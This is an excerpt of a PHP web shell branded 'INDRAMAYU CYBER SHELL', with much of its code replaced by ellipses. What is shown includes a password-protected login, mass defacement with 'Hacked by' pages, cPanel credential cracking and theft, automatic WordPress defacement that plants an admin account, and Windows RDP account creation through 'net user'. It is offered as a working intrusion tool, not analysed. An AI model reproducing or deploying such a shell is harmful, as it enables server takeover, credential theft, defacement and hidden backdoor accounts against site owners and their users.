...
$auth_pass = "c6a20bcf3ef78a1541ad23598cb295c8"; // default: INDRAMAYU CYBER
$color = "#9900ff";
...
< INDRAMAYU CYBER SHELL>
 ---------------------------
<center><br><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8gX7rw159AlNrqNT-v-imVSUa_w2FWw4uE5MNuecFcup5fgGgt2Az4Em1nIpitrs9uvAqq6q_Sjm3gUjxnYxfZLpUyqXafP8D96xYLFxKJD3VAWX56W3slihTO4OtV3gqA8jqdqFNBLCCxrKZZh9_DtUWIq3Lf-3DL16B1G6mOuuVHXdybpr-iSp24Q/s320/20220929_224322.gif"width="300"height="300"></center>
...
<head>
<title>INDRAMAYU CYBER</title>
<meta name='author' content='INDRAMAYU CYBER'>
<meta charset="UTF-8">
<style type='text/css'>
...
// Tapi Selebihnya, itu hasil kreasi INDRAMAYU CYBER sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member INDRAMAYU CYBER. & all my friends.
###############################################################################
function w($dir,$perm) {
	if(!is_writable($dir)) {
...
if($_GET['logout'] == true) {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by INDRAMAYU CYBER</textarea><br>
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='INDRAMAYU CYBER' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='INDRAMAYU CYBER' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>INDRAMAYU CYBER.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>INDRAMAYU CYBER.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by INDRAMAYU CYBER' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='INDRAMAYU CYBER'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['auto_deface_wp']) {
		...
		$user = "INDRAMAYU CYBER";
		$pass = "INDRAMAYU CYBER";
		$passx = md5($pass);
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by INDRAMAYU CYBER' required><br>
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user INDRAMAYU CYBER");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>INDRAMAYU CYBER</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='INDRAMAYU CYBER' required>
			<input type='text' name='pass' placeholder='password' value='INDRAMAYU CYBER' required>
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://INDRAMAYU CYBER.or.id/' target='_blank'><font color=lime>INDRAMAYU CYBER</font></a></center>";
}
?>
</html>
